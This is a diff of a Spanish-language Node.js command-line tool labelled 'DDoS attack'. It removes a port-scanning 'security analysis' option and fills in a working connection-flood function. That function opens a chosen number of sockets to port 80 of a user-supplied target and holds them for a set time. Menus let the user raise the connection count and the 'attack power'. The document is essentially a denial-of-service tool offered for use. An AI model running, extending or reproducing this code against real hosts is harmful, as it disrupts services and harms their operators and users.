@@ -1,76 +1,107 @@
 const net = require('net');
+const rl = require('readline').createInterface({
+input: process.stdin,
+output: process.stdout
+});
 
-const portScan = async (host, ports) => {
-const results = [];
-for (let i = 0; i < ports.length; i++) {
-const port = ports[i];
+const colors = {
+reset: '[0m',
+bright: '[1m',
+dim: '[2m',
+underscore: '[4m',
+blink: '[5m',
+reverse: '[7m',
+hidden: '[8m',
+fg: {
+black: '[30m',
+red: '[31m',
+green: '[32m',
+yellow: '[33m',
+blue: '[34m',
+magenta: '[35m',
+cyan: '[36m',
+white: '[37m',
+},
+bg: {
+black: '[40m',
+red: '[41m',
+green: '[42m',
+yellow: '[43m',
+blue: '[44m',
+magenta: '[45m',
+cyan: '[46m',
+white: '[47m',
+},
+};
+
+const decorations = {
+underline: '[4m',
+bold: '[1m',
+italic: '[3m',
+};
+
+const ddosAttack = async (url, numConnections, attackDuration) => {
+try {
+console.log(`[36m Iniciando ataque DDoS...`);
+const sockets = [];
+for (let i = 0; i < numConnections; i++) {
 const socket = new net.Socket();
-socket.connect(port, host);
-socket.setTimeout(1000); // Agregamos un timeout de 1 segundo
-
-socket.on('connect', () => {
-results.push(`${port} is open`);
-socket.destroy();
+socket.connect(80, url, () => {
+console.log(`[31m Conectado a ${url}`);
 });
-
-socket.on('timeout', () => {
-results.push(`${port} is closed`);
-socket.destroy();
+socket.on('data', (data) => {
+console.log(`Dato recibido de ${url}`);
 });
-
 socket.on('error', (err) => {
-results.push(`${port} is closed`);
+console.error(`Error: ${err}`);
 });
+sockets.push(socket);
 }
-return results;
-};
 
-const securityScan = async (host) => {
-const ports = await portScan(host, [80, 443, 22]);
-const results = [];
-
-ports.forEach((port) => {
-if (port.includes('open')) {
-results.push(`Puerto ${port} abierto`);
-} else {
-results.push(`Puerto ${port} cerrado`);
+setTimeout(() => {
+console.log('Ataque finalizado');
+sockets.forEach((socket) => socket.destroy());
+}, attackDuration * 1000);
+} catch (error) {
+console.error(`Error: ${error}`);
 }
-});
-
-return results;
-};
-
-const ddosAttack = async (host, numConnections, attackDuration) => {
-// Aquí va el código de ataque DDoS
-console.log(`Iniciando ataque DDoS contra ${host}...`);
 };
 
 const updateCode = async () => {
-// Aquí va el código para actualizar el código
-console.log(`Actualizando código...`);
+try {
+console.log(`[36m Actualizando código...`);
+const exec = require('child_process').exec;
+exec('git pull origin main', (error, stdout, stderr) => {
+if (error) {
+console.error(`Error: ${error}`);
+} else {
+console.log(`[36m Código actualizado correctamente!`);
+}
+});
+} catch (error) {
+console.error(`Error: ${error}`);
+}
 };
 
 const showMenu = () => {
-console.clear();
-console.log('[31m              DDoS attack    ');
-console.log('                           ');
-console.log('[36m       ⭐️ Desarrollado por Keiji821');
-console.log('[33m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃');
+console.clear(); // Limpiar la consola
+console.log('[31m         DDoS attack    ');
+console.log('⭐️ Desarrollado por Keiji821');
+console.log('[36m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃');
 console.log('[32m ︳1. Iniciar ataque DDoS                ︳');
-console.log('[36m ︳2. Actualizar código                  ︳');
-console.log('[32m ︳3. Configurar conexiones simultaneas  ︳');
+console.log('[34m ︳2. Actualizar código                  ︳');
+console.log('[36m ︳3. Configurar conexiones simultaneas  ︳');
 console.log('[33m ︳4. Aumentar potencia del ataque       ︳');
-console.log('[32m ︳5. Realizar análisis de seguridad     ︳');
-console.log('[31m ︳6. Salir                              ︳');
-console.log('[33m ⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸍');
-rl.setPrompt('[32m  🌐➤ ');
-rl.prompt();
+console.log('[31m ︳5. Salir                              ︳');
+console.log('[36m ⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⸍');
+rl.setPrompt('[37m  🌐➤ '); // Establecer el texto de la casilla "Opción: "
+rl.prompt(); // Mostrar la casilla "Opción:"
 };
 
-let numConnections = 100;
-let attackDuration = 60;
+let numConnections = 100; // Número de conexiones simultaneas por defecto
+let attackDuration = 60; // Duración del ataque por defecto
 
-showMenu();
+showMenu(); // Mostrar el menú principal al inicio
 
 rl.on('line', (option) => {
 switch (option.trim()) {
@@ -82,13 +113,13 @@ console.log('URL invalida');
 showMenu();
 } else {
 ddosAttack(url, numConnections, attackDuration);
-showMenu();
+showMenu(); // Volver a mostrar el menú principal
 }
 });
 break;
 case '2':
 updateCode();
-showMenu();
+showMenu(); // Volver a mostrar el menú principal
 break;
 case '3':
 console.log('Ingrese el número de conexiones simultaneas: ');
@@ -99,7 +130,7 @@ showMenu();
 } else {
 numConnections = parseInt(conexiones);
 console.log(`Conexiones simultaneas establecidas en ${numConnections}`);
-showMenu();
+showMenu(); // Volver a mostrar el menú principal
 }
 });
 break;
@@ -112,26 +143,11 @@ showMenu();
 } else {
 attackDuration = parseInt(duration);
 console.log(`Duración del ataque establecida en ${attackDuration} segundos`);
-showMenu();
+showMenu(); // Volver a mostrar el menú principal
 }
 });
 break;
 case '5':
-console.log('Ingrese la URL del objetivo para el análisis de seguridad: ');
-rl.question('URL: ', (url) => {
-if (url === '') {
-console.log('URL invalida');
-showMenu();
-} else {
-securityScan(url).then((results) => {
-console.log(`Análisis de seguridad para ${url}:`);
-results.forEach((result) => console.log(result));
-showMenu();
-}).catch((err) => console.error(err));
-}
-});
-break;
-case '6':
 console.log('Saliendo...');
 process.exit();
 break;
